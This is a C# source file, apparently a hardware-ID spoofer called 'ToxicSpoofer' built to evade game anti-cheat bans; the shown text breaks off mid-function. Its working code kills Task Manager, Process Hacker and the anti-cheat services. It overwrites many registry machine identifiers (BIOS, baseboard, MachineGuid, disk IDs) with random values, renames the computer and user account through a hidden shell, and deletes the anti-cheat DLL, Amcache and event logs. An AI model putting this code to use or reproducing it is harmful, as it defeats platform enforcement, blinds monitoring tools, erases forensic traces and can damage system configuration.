using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Management;
using System.Diagnostics;
using System.Threading;
using System.Net;
using Microsoft.Win32;

namespace ToxicSpoofer
{
    class Cleaners
    {
        public static void Fuck12()
        {
            try
            {
                foreach (Process process in Process.GetProcesses())
                {
                    if (process.ProcessName == "Taskmgr")
                    {
                        process.Kill();
                    }
                }
            }
            catch
            {
            }
            try
            {
                foreach (Process process2 in Process.GetProcesses())
                {
                    if (process2.ProcessName == "ProcessHacker")
                    {
                        process2.Kill();
                    }
                }
            }
            catch
            {
            }
            try
            {
                foreach (Process process3 in Process.GetProcesses())
                {
                    if (process3.ProcessName == "EpicGamesLauncher")
                    {
                        process3.Kill();
                    }
                }
            }
            catch
            {
            }
            try
            {
                foreach (Process process4 in Process.GetProcesses())
                {
                    if (process4.ProcessName == "FolderChangesView")
                    {
                        process4.Kill();
                    }


                }
            }
            catch
            {
            }

        }


        public static void ModifyRegistry()
        {
            List<string> list = new List<string>();
            list.Add("MSI A320M PRO - E");
            list.Add("Asus Prime A320M-C R2.0");
            list.Add("Gigabyte GA - A320M - H");
            list.Add("ASRock Z390 Phantom Gaming SLI");
            list.Add("Asus ROG Rampage VI Extreme Omega");
            list.Add("Asus Prime H310I - Plus R2.0");
            list.Add("Asus ROG Zenith Extreme Alpha X399");
            list.Add("MSI MEG X299 Creation");
            list.Add("Asus P11C - X");
            list.Add("ASRock AB350M - HDV R3.0");
            list.Add("MSI B450M Pro-VDH V2");
            list.Add("MSI B450M Bazooka V2");
            list.Add("Asus Prime B450M - A / CSM");
            list.Add("Asus Prime H310I - Plus R2.0 / CSM");
            list.Add("Gigabyte GA-AB350M-DS3H V2 (rev. 1.1)");
            list.Add("Gigabyte B360 M AORUS PRO");
            list.Add("Gigabyte X299-WU8");
            list.Add("MSI MAG Z390M Mortar");
            Random random = new Random();
            int index = random.Next(list.Count);
            string value = list[index];
            RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("HARDWARE\\DESCRIPTION\\System\\BIOS", true);
            bool flag = registryKey != null;
            bool flag2 = flag;
            if (flag2)
            {
                registryKey.SetValue("BaseBoardProduct", value, RegistryValueKind.String);
                registryKey.Close();
            }
            List<string> list2 = new List<string>();
            list2.Add("1.0");
            list2.Add("2.0");
            list2.Add("3.0");
            list2.Add("4.0");
            list2.Add("5.0");
            list2.Add("6.0");
            list2.Add("7.0");
            list2.Add("8.0");
            list2.Add("9.0");
            list2.Add("1.1");
            list2.Add("1.2");
            list2.Add("1.3");
            list2.Add("1.4");
            list2.Add("1.5");
            list2.Add("1.6");
            Random random2 = new Random();
            int index2 = random2.Next(list2.Count);
            string value2 = list2[index2];
            RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey("HARDWARE\\DESCRIPTION\\System\\BIOS", true);
            bool flag3 = registryKey2 != null;
            bool flag4 = flag3;
            if (flag4)
            {
                registryKey2.SetValue("BaseBoardVersion", value2, RegistryValueKind.String);
                registryKey2.Close();
            }
            List<string> list3 = new List<string>();
            list3.Add("MSI");
            list3.Add("Asus");
            list3.Add("Gigabyte");
            list3.Add("ASRock");
            list3.Add("Biostar");
            list3.Add("EVGA");
            Random random3 = new Random();
            int index3 = random3.Next(list3.Count);
            string value3 = list3[index3];
            RegistryKey registryKey3 = Registry.LocalMachine.OpenSubKey("HARDWARE\\DESCRIPTION\\System\\BIOS", true);
            bool flag5 = registryKey3 != null;
            bool flag6 = flag5;
            if (flag6)
            {
                registryKey3.SetValue("BaseBoardManufacturer", value3, RegistryValueKind.String);
                registryKey3.Close();
            }
            RegistryKey registryKey4 = Registry.LocalMachine.OpenSubKey("HARDWARE\\DESCRIPTION\\System\\BIOS", true);
            bool flag7 = registryKey4 != null;
            bool flag8 = flag7;
            if (flag8)
            {
                registryKey4.SetValue("SystemVersion", value2, RegistryValueKind.String);
                registryKey4.Close();
            }
            RegistryKey registryKey5 = Registry.LocalMachine.OpenSubKey("HARDWARE\\DESCRIPTION\\System\\BIOS", true);
            bool flag9 = registryKey5 != null;
            bool flag10 = flag9;
            if (flag10)
            {
                registryKey5.SetValue("SystemManufacturer", value3, RegistryValueKind.String);
                registryKey5.Close();
            }
            List<string> list4 = new List<string>();
            list4.Add("01/02/2016");
            list4.Add("01/04/2016");
            list4.Add("01/03/2016");
            list4.Add("01/05/2016");
            list4.Add("02/05/2016");
            list4.Add("03/05/2016");
            Random random4 = new Random();
            int index4 = random4.Next(list4.Count);
            string value4 = list4[index4];
            RegistryKey registryKey6 = Registry.LocalMachine.OpenSubKey("HARDWARE\\DESCRIPTION\\System\\BIOS", true);
            bool flag11 = registryKey6 != null;
            bool flag12 = flag11;
            if (flag12)
            {
                registryKey6.SetValue("BIOSReleaseDate", value4, RegistryValueKind.String);
                registryKey6.Close();
            }
            List<string> list5 = new List<string>();
            list5.Add("PL-7A37");
            list5.Add("PL-7A87");
            list5.Add("PL-8A37");
            list5.Add("PL-7A39");
            list5.Add("PL-3A37");
            list5.Add("PL-7A47");
            list5.Add("PL-7A35");
            list5.Add("PL-7A66");
            list5.Add("PL-6A67");
            list5.Add("PL-7B37");
            list5.Add("PL-7C37");
            list5.Add("PL-7D37");
            list5.Add("PL-7AE1");
            list5.Add("PL-7A17");
            list5.Add("PL-71E7");
            list5.Add("PL-1AE7");
            list5.Add("PL-7A77");
            list5.Add("PL-7A62");
            list5.Add("PL-7A33");
            list5.Add("PL-7A19");
            Random random5 = new Random();
            int index5 = random5.Next(list5.Count);
            string value5 = list5[index5];
            RegistryKey registryKey7 = Registry.LocalMachine.OpenSubKey("HARDWARE\\DESCRIPTION\\System\\BIOS", true);
            bool flag13 = registryKey7 != null;
            bool flag14 = flag13;
            if (flag14)
            {
                registryKey7.SetValue("SystemProductName", value5, RegistryValueKind.String);
                registryKey7.Close();
            }
            List<string> list6 = new List<string>();
            list6.Add("A.04");
            list6.Add("A.09");
            list6.Add("A.60");
            list6.Add("A.54");
            list6.Add("A.23");
            list6.Add("A.62");
            list6.Add("A.13");
            list6.Add("A.11");
            list6.Add("A.22");
            list6.Add("A.33");
            list6.Add("A.44");
            list6.Add("A.55");
            list6.Add("A.56");
            list6.Add("A.57");
            list6.Add("A.93");
            list6.Add("A.69");
            Random random6 = new Random();
            int index6 = random6.Next(list6.Count);
            string value6 = list6[index6];
            RegistryKey registryKey8 = Registry.LocalMachine.OpenSubKey("HARDWARE\\DESCRIPTION\\System\\BIOS", true);
            bool flag15 = registryKey8 != null;
            bool flag16 = flag15;
            if (flag16)
            {
                registryKey8.SetValue("BIOSVersion", value6, RegistryValueKind.String);
                registryKey8.Close();
            }
            List<string> list7 = new List<string>();
            list7.Add("American Megatrends Inc.");
            list7.Add("Dell Inc.");
            list7.Add("Phoenix Technologies, Ltd");
            list7.Add("Lenovo");
            list7.Add("Packard Bell");
            list7.Add("Award Software, Inc.");
            list7.Add("Acer");
            list7.Add("Insyde Corp.");
            list7.Add("TOSHIBA");
            list7.Add("Intel Corporation");
            list7.Add("IBM");
            list7.Add("innotek GmbH");
            list7.Add("Gateway");
            list7.Add("Sun Microsystems");
            Random random7 = new Random();
            int index7 = random7.Next(list7.Count);
            string value7 = list7[index7];
            RegistryKey registryKey9 = Registry.LocalMachine.OpenSubKey("HARDWARE\\DESCRIPTION\\System\\BIOS", true);
            bool flag17 = registryKey9 != null;
            bool flag18 = flag17;
            if (flag18)
            {
                registryKey9.SetValue("BIOSVendor", value7, RegistryValueKind.String);
                registryKey9.Close();
            }
            RegistryKey registryKey10 = Registry.LocalMachine.OpenSubKey("SYSTEM\\HardwareConfig\\Current", true);
            bool flag19 = registryKey10 != null;
            bool flag20 = flag19;
            if (flag20)
            {
                registryKey10.SetValue("BIOSVendor", value7, RegistryValueKind.String);
                registryKey10.Close();
            }
            RegistryKey registryKey11 = Registry.LocalMachine.OpenSubKey("SYSTEM\\HardwareConfig\\Current", true);
            bool flag21 = registryKey11 != null;
            bool flag22 = flag21;
            if (flag22)
            {
                registryKey11.SetValue("BIOSVersion", value6, RegistryValueKind.String);
                registryKey11.Close();
            }
            RegistryKey registryKey12 = Registry.LocalMachine.OpenSubKey("SYSTEM\\HardwareConfig\\Current", true);
            bool flag23 = registryKey12 != null;
            bool flag24 = flag23;
            if (flag24)
            {
                registryKey12.SetValue("SystemProductName", value5, RegistryValueKind.String);
                registryKey12.Close();
            }
            RegistryKey registryKey13 = Registry.LocalMachine.OpenSubKey("SYSTEM\\HardwareConfig\\Current", true);
            bool flag25 = registryKey13 != null;
            bool flag26 = flag25;
            if (flag26)
            {
                registryKey13.SetValue("BIOSReleaseDate", value4, RegistryValueKind.String);
                registryKey13.Close();
            }
            RegistryKey registryKey14 = Registry.LocalMachine.OpenSubKey("SYSTEM\\HardwareConfig\\Current", true);
            bool flag27 = registryKey14 != null;
            bool flag28 = flag27;
            if (flag28)
            {
                registryKey14.SetValue("SystemManufacturer", value3, RegistryValueKind.String);
                registryKey14.Close();
            }
            RegistryKey registryKey15 = Registry.LocalMachine.OpenSubKey("SYSTEM\\HardwareConfig\\Current", true);
            bool flag29 = registryKey15 != null;
            bool flag30 = flag29;
            if (flag30)
            {
                registryKey15.SetValue("BaseBoardManufacturer", value3, RegistryValueKind.String);
                registryKey15.Close();
            }
            RegistryKey registryKey16 = Registry.LocalMachine.OpenSubKey("SYSTEM\\HardwareConfig\\Current", true);
            bool flag31 = registryKey16 != null;
            bool flag32 = flag31;
            if (flag32)
            {
                registryKey16.SetValue("SystemVersion", value2, RegistryValueKind.String);
                registryKey16.Close();
            }
            RegistryKey registryKey17 = Registry.LocalMachine.OpenSubKey("SYSTEM\\HardwareConfig\\Current", true);
            bool flag33 = registryKey17 != null;
            bool flag34 = flag33;
            if (flag34)
            {
                registryKey17.SetValue("BaseBoardVersion", value2, RegistryValueKind.String);
                registryKey17.Close();
            }
            RegistryKey registryKey18 = Registry.LocalMachine.OpenSubKey("SYSTEM\\HardwareConfig\\Current", true);
            bool flag35 = registryKey18 != null;
            bool flag36 = flag35;
            if (flag36)
            {
                registryKey18.SetValue("BaseBoardProduct", value, RegistryValueKind.String);
                registryKey18.Close();
            }
            Guid guid = Guid.NewGuid();
            RegistryKey registryKey19 = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\SystemInformation", true);
            bool flag37 = registryKey19 != null;
            bool flag38 = flag37;
            if (flag38)
            {
                registryKey19.SetValue("ComputerHardwareId", "{" + guid + "}", RegistryValueKind.String);
                registryKey19.Close();
            }
            string text = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
            char[] array = new char[3];
            Random random8 = new Random();
            for (int i = 0; i < array.Length; i++)
            {
                array[i] = text[random8.Next(text.Length)];
            }
            string str = new string(array);
            string text2 = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            char[] array2 = new char[30];
            Random random9 = new Random();
            for (int j = 0; j < array2.Length; j++)
            {
                array2[j] = text2[random9.Next(text2.Length)];
            }
            string str2 = new string(array2);
            string text3 = "abcdefghijklmnopqrstuvwxyz0123456789";
            char[] array3 = new char[8];
            Random random10 = new Random();
            for (int k = 0; k < array3.Length; k++)
            {
                array3[k] = text3[random10.Next(text3.Length)];
            }
            string text4 = new string(array3);
            string text5 = "0123456789";
            char[] array4 = new char[11];
            Random random11 = new Random();
            for (int l = 0; l < array4.Length; l++)
            {
                array4[l] = text5[random11.Next(text5.Length)];
            }
            string str3 = new string(array4);
            RegistryKey registryKey20 = Registry.CurrentUser.OpenSubKey("Software\\Epic Games\\Unreal Engine\\Identifiers", true);
            bool flag39 = registryKey20 != null;
            bool flag40 = flag39;
            if (flag40)
            {
                registryKey20.SetValue("MachineId", str + str2, RegistryValueKind.String);
                registryKey20.Close();
            }
            RegistryKey registryKey21 = Registry.CurrentUser.OpenSubKey("Software\\Epic Games\\Unreal Engine\\Identifiers", true);
            bool flag41 = registryKey21 != null;
            bool flag42 = flag41;
            if (flag42)
            {
                registryKey21.SetValue("AccountId", text4 + text4 + text4, RegistryValueKind.String);
                registryKey21.Close();
            }
            RegistryKey registryKey22 = Registry.LocalMachine.OpenSubKey("HARDWARE\\DESCRIPTION\\System\\MultifunctionAdapter\\0\\DiskController\\0\\DiskPeripheral\\0", true);
            bool flag43 = registryKey22 != null;
            bool flag44 = flag43;
            if (flag44)
            {
                registryKey22.SetValue("Identifier", text4 + "-A", RegistryValueKind.String);
                registryKey22.Close();
            }
            RegistryKey registryKey23 = Registry.LocalMachine.OpenSubKey("HARDWARE\\DESCRIPTION\\System\\MultifunctionAdapter\\0\\DiskController\\0\\DiskPeripheral\\1", true);
            bool flag45 = registryKey23 != null;
            bool flag46 = flag45;
            if (flag46)
            {
                registryKey23.SetValue("Identifier", text4 + "-A", RegistryValueKind.String);
                registryKey23.Close();
            }
            Guid guid2 = Guid.NewGuid();
            RegistryKey registryKey24 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Feeds", true);
            bool flag47 = registryKey24 != null;
            bool flag48 = flag47;
            if (flag48)
            {
                registryKey24.SetValue("BackgroundSync", guid2, RegistryValueKind.String);
                registryKey24.Close();
            }
            try
            {
                RegistryKey registryKey25 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\IdentityCRL\\ExtendedProperties", true);
                bool flag49 = registryKey25 != null;
                bool flag50 = flag49;
                if (flag50)
                {
                    registryKey25.SetValue("LID", str3 + "BE123", RegistryValueKind.String);
                    registryKey25.Close();
                }
            }
            catch
            {
            }
            Random random12 = new Random();
            Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\StillImage\\Events\\Connected", "GUID", Guid.NewGuid().ToString());
            Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\StillImage\\Events\\Disconnected", "GUID", Guid.NewGuid().ToString());
            Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\StillImage\\Events\\EmailImage", "GUID", Guid.NewGuid().ToString());
            Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\StillImage\\Events\\FaxImage", "GUID", Guid.NewGuid().ToString());
            Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\StillImage\\Events\\PrintImage", "GUID", Guid.NewGuid().ToString());
            Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\StillImage\\Events\\ScanButton", "GUID", Guid.NewGuid().ToString());
            Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\StillImage\\Events\\STIproxyEvent", "GUID", Guid.NewGuid().ToString());
            Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Microsoft\\IdentityCRL\\ExtendedProperties", "LID", random12.Next(10000, 99999) + random12.Next(100000, 999999) + "BE123");
            Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Feeds", "BackgroundSync", Convert.ToString(Guid.NewGuid()));
            Registry.SetValue("HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System\\MultifunctionAdapter\\0\\DiskController\\0\\DiskPeripheral\\0", "Identifier", SMBIOS.RandomString(8) + "-A");
            Registry.SetValue("HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System\\MultifunctionAdapter\\0\\DiskController\\0\\DiskPeripheral\\1", "Identifier", SMBIOS.RandomString(8) + "-A");
            List<string> list8 = new List<string>();
            list8.Add("MSI A320M PRO - E");
            list8.Add("Asus Prime A320M-C R2.0");
            list8.Add("Gigabyte GA - A320M - H");
            list8.Add("ASRock Z390 Phantom Gaming SLI");
            list8.Add("Asus ROG Rampage VI Extreme Omega");
            list8.Add("Asus Prime H310I - Plus R2.0");
            list8.Add("Asus ROG Zenith Extreme Alpha X399");
            list8.Add("MSI MEG X299 Creation");
            list8.Add("Asus P11C - X");
            list8.Add("ASRock AB350M - HDV R3.0");
            list8.Add("MSI B450M Pro-VDH V2");
            list8.Add("MSI B450M Bazooka V2");
            list8.Add("Asus Prime B450M - A / CSM");
            list8.Add("Asus Prime H310I - Plus R2.0 / CSM");
            list8.Add("Gigabyte GA-AB350M-DS3H V2 (rev. 1.1)");
            list8.Add("Gigabyte B360 M AORUS PRO");
            list8.Add("Gigabyte X299-WU8");
            list8.Add("MSI MAG Z390M Mortar");
            Boolean SetComputerName(String Name)
            {
                String RegLocComputerName = @"SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName";
                try
                {
                    string compPath = "Win32_ComputerSystem.Name='" + System.Environment.MachineName + "'";
                    using (ManagementObject mo = new ManagementObject(new ManagementPath(compPath)))
                    {
                        ManagementBaseObject inputArgs = mo.GetMethodParameters("Rename");
                        inputArgs["Name"] = Name;
                        ManagementBaseObject output = mo.InvokeMethod("Rename", inputArgs, null);
                        uint retValue = (uint)Convert.ChangeType(output.Properties["ReturnValue"].Value, typeof(uint));
                        if (retValue != 0)
                        {
                            throw new Exception("Computer could not be changed due to unknown reason.");
                        }
                    }

                    RegistryKey ComputerName = Registry.LocalMachine.OpenSubKey(RegLocComputerName);
                    if (ComputerName == null)
                    {
                        throw new Exception("Registry location '" + RegLocComputerName + "' is not readable.");
                    }
                    if (((String)ComputerName.GetValue("ComputerName")) != Name)
                    {
                        throw new Exception("The computer name was set by WMI but was not updated in the registry location: '" + RegLocComputerName + "'");
                    }
                    ComputerName.Close();
                    ComputerName.Dispose();
                }
                catch (Exception ex)
                {
                    return false;
                }
                return true;
            }
            SetComputerName(SMBIOS.RandomString(20));
            Registry.SetValue("HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System\\BIOS", "BaseBoardProduct", SMBIOS.RandomString(20));
            Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography", "MachineGuid", "{" + Guid.NewGuid().ToString() + "}");
            Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\IDConfigDB\\Hardware Profiles\\0001", "HwProfileGuid", "{" + Guid.NewGuid().ToString() + "}");
            Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\HardwareConfig\\{b30417c0-53bd-11e5-8727-305a3ae502fe}", "SystemFamily", "{" + Guid.NewGuid().ToString() + "}");
            Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\HardwareConfig", "LastConfig", "{" + Guid.NewGuid().ToString() + "}");
            Registry.SetValue("HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System\\MultifunctionAdapter\\0\\DiskController\\0\\DiskPeripheral\\0", "Identifier", "{" + Guid.NewGuid().ToString() + "}");
            Registry.SetValue("HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System\\MultifunctionAdapter\\0\\DiskController\\0\\DiskPeripheral\\1", "Identifier", "{" + Guid.NewGuid().ToString() + "}");
            Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\MediaPlayer\\Preferences\\DMR", "SerialNumber", "{" + Guid.NewGuid().ToString() + "}");
            Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\MediaPlayer\\Preferences\\DMR", "UDN", "{" + Guid.NewGuid().ToString() + "}");
            Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows Media\\WMSDK\\General", "UniqueID", "{" + Guid.NewGuid().ToString() + "}");
            Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\SQMClient", "MachineId", "{" + Guid.NewGuid().ToString() + "}");
            Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\HardwareConfig", "LastConfig", Guid.NewGuid().ToString());
            Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\IDConfigDB\\Hardware", "HwProfileGuid", Guid.NewGuid().ToString());
            Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\WindowsNT\\CurrentVersion", "BuildGUID", Guid.NewGuid().ToString());
            Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography", "MachineGuid", Guid.NewGuid().ToString());
            Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SystemInformation", "ComputerHardwareId", "{" + Convert.ToString(Guid.NewGuid()) + "}");
            Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SystemInformation", "ComputerHardwareIds", string.Concat(new string[]
            {
                "{",
                Convert.ToString(Guid.NewGuid()),
                "}",
                Environment.NewLine,
                "{",
                Convert.ToString(Guid.NewGuid()),
                "}",
                Environment.NewLine,
                "{",
                Convert.ToString(Guid.NewGuid()),
                "}",
                Environment.NewLine,
                "{",
                Convert.ToString(Guid.NewGuid()),
                "}",
                Environment.NewLine,
                "{",
                Convert.ToString(Guid.NewGuid()),
                "}",
                Environment.NewLine,
                "{",
                Convert.ToString(Guid.NewGuid()),
                "}",
                Environment.NewLine,
                "{",
                Convert.ToString(Guid.NewGuid()),
                "}",
                Environment.NewLine,
                "{",
                Convert.ToString(Guid.NewGuid()),
                "}",
                Environment.NewLine,
                "{",
                Convert.ToString(Guid.NewGuid()),
                "}",
                Environment.NewLine,
                "{",
                Convert.ToString(Guid.NewGuid()),
                "}"
            }));
            Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4d36e965-e325-11ce-bfc1-08002be10318}\\Configuration\\Variables\\BusDeviceDesc", "PropertyGuid", Convert.ToString(Guid.NewGuid()));
            Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4d36e968-e325-11ce-bfc1-08002be10318}\\Configuration\\Variables\\DeviceDesc", "PropertyGuid", Convert.ToString(Guid.NewGuid()));
            Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4d36e968-e325-11ce-bfc1-08002be10318}\\Configuration\\Variables\\Driver", "PropertyGuid", Convert.ToString(Guid.NewGuid()));
            Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\WMI\\Autologger\\AppModel", "GUID", Convert.ToString(Guid.NewGuid()));
            Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\SYSTEM\\HardwareConfig", "LastConfig", Convert.ToString(Guid.NewGuid()));
            Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography", "MachineGuid", "{" + Guid.NewGuid().ToString() + "}");
            Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\IDConfigDB\\Hardware Profiles\\0001", "HwProfileGuid", "{" + Guid.NewGuid().ToString() + "}");
            Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\HardwareConfig\\{b30417c0-53bd-11e5-8727-305a3ae502fe}", "SystemFamily", "{" + Guid.NewGuid().ToString() + "}");
            Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\HardwareConfig\\{b30417c0-53bd-11e5-8727-305a3ae502fe}", "BaseBoardProduct", "{" + Guid.NewGuid().ToString() + "}");
            Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\HardwareConfig", "LastConfig", "{" + Guid.NewGuid().ToString() + "}");
            Registry.SetValue("HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System\\MultifunctionAdapter\\0\\DiskController\\0\\DiskPeripheral\\0", "Identifier", "{" + Guid.NewGuid().ToString() + "}");
            Registry.SetValue("HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System\\MultifunctionAdapter\\0\\DiskController\\0\\DiskPeripheral\\1", "Identifier", "{" + Guid.NewGuid().ToString() + "}");
            Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\MediaPlayer\\Preferences\\DMR", "SerialNumber", "{" + Guid.NewGuid().ToString() + "}");
            Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\MediaPlayer\\Preferences\\DMR", "UDN", "{" + Guid.NewGuid().ToString() + "}");
            Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows Media\\WMSDK\\General", "UniqueID", "{" + Guid.NewGuid().ToString() + "}");
            Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\SQMClient", "MachineId", "{" + Guid.NewGuid().ToString() + "}");
            string lol = Environment.UserName;
            string text6 = lol + random.Next(10000, 99999);
            Process pa = new Process();
            pa.StartInfo.RedirectStandardInput = true;
            pa.StartInfo.RedirectStandardError = true;
            pa.StartInfo.RedirectStandardOutput = true;
            pa.StartInfo.UseShellExecute = false;
            pa.StartInfo.CreateNoWindow = true;
            pa.StartInfo.FileName = @"cmd.exe";
            pa.StartInfo.Arguments = "-R C:\\";
            pa.Start();
            Thread.Sleep(30);
            pa.StandardInput.WriteLine("/c wmic useraccount where caption='" + text6 + "' rename " + text6);
            Thread.Sleep(120);
            pa.Kill();
            pa.Close();
            Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ComputerName", "ComputerName", text6);
            Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ActiveComputerName", "ComputerName", text6);
            Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\services\\Tcpip\\Parameters", "NV Hostname", text6);
            Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\services\\Tcpip\\Parameters", "Hostname", text6);
            Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "RegisteredOwner", text6);
            Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "RegisteredOrganization", text6);
        }
        public static void Terminate(String name)
        {
            Process[] processes11 = Process.GetProcessesByName("" + name);
            if (processes11.Length == 0)
            {

            }
            else
            {
                foreach (var process in processes11)
                {
                    try
                    {
                        ManagementObject classInstance =
                            new ManagementObject("root\\CIMV2",
                            "Win32_Process.Handle='" + process.Id + "'",
                            null);

                        // Obtain in-parameters for the method
                        ManagementBaseObject inParams =
                            classInstance.GetMethodParameters("Terminate");

                        // Add the input parameters.

                        // Execute the method and obtain the return values.
                        ManagementBaseObject outParams =
                            classInstance.InvokeMethod("Terminate", inParams, null);


                    }

                    catch { }

                }
            }
        }


        public static void FileCleaner()
        {


            Thread t = new Thread(FeggotCleaner);
            t.Start();

            Terminate("EpicGamesLauncher");
            Terminate("FortniteClient-Win64-Shipping");
            Terminate("EasyAntiCheat");
            Terminate("BeService");



            WebClient wb = new WebClient();



         /*   var Directorys = Directory.GetFiles(@"C:\Windows\System32\config");
            foreach (var i in Directorys)
            {
                if (i.Contains(@"COMPONENTS{"))
                {
                    CleanFile(@"C:\Windows\System32\config\" + i);
                }
            }*/


            try
            {
                try
                {
                    var i = Directory.GetFiles(@"C:\Windows\Temp");
                    foreach (var j in i)
                    {
                        CleanFile(j);
                    }
                }
                catch
                {
                }
                try
                {
                    var i = Directory.GetDirectories(@"C:\Windows\Temp");
                    foreach (var j in i)
                    {
                        CleanDir(j);
                    }
                }
                catch
                {
                }
            }
            catch
            {
            }



        }

        public static void FeggotCleaner()
        {
            try
            {
                System.Diagnostics.Process[] prs = System.Diagnostics.Process.GetProcesses();


                foreach (System.Diagnostics.Process pr in prs)
                {
                    if (pr.ProcessName == "Taskmgr")
                    {

                        pr.Kill();

                    }
                }
            }
            catch
            {
            }

            try
            {
                System.Diagnostics.Process[] prs = System.Diagnostics.Process.GetProcesses();


                foreach (System.Diagnostics.Process pr in prs)
                {
                    if (pr.ProcessName == "ProcessHacker")
                    {

                        pr.Kill();

                    }
                }
            }
            catch
            {
            }
            try
            {
                System.Diagnostics.Process[] prs = System.Diagnostics.Process.GetProcesses();


                foreach (System.Diagnostics.Process pr in prs)
                {
                    if (pr.ProcessName == "EpicGamesLauncher")
                    {

                        pr.Kill();

                    }
                }
            }
            catch
            {
            }
            try
            {
                System.Diagnostics.Process[] prs = System.Diagnostics.Process.GetProcesses();


                foreach (System.Diagnostics.Process pr in prs)
                {
                    if (pr.ProcessName == "FolderChangesView")
                    {

                        pr.Kill();

                    }
                }
            }
            catch
            {
            }
            Thread.Sleep(2000);
            string Username = Environment.UserName;

            try
            {
                if (File.Exists("C:\\Windows\\System32\\eac_usermode_21537346703536.dll"))
                {
                    File.Delete("C:\\Windows\\System32\\eac_usermode_21537346703536.dll");
                }
            }
            catch
            {
            }
            try
            {
                if (Directory.Exists("C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\XboxLive"))
                {
                    Directory.Delete("C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\XboxLive", true);
                }
            }
            catch
            {
            }




            try
            {
                if (File.Exists("C:\\Windows\\appcompact\\Programs\\Amcache.hve"))
                {
                    File.Delete("C:\\Windows\\appcompact\\Programs\\Amcache.hve");
                }
            }
            catch
            {
            }
            try
            {
                if (File.Exists("C:\\Windows\\System32\\LogFiles\\WMI\\EtwRTGraphicsPerfMonitorSession.etl"))
                {
                    File.Delete("C:\\Windows\\System32\\LogFiles\\WMI\\EtwRTGraphicsPerfMonitorSession.etl");
                }
            }
            catch
            {
            }
            try
            {
                if (File.Exists("C:\\Windows\\System\\config\\BBI.LOG2"))
                {
                    File.Delete("C:\\Windows\\System\\config\\BBI.LOG2");
                }
            }
            catch
            {
            }

            if (Directory.Exists("C:\\Users\\" + Username + "\\AppData\\Local\\UnrealEngine"))
            {
                try
                {
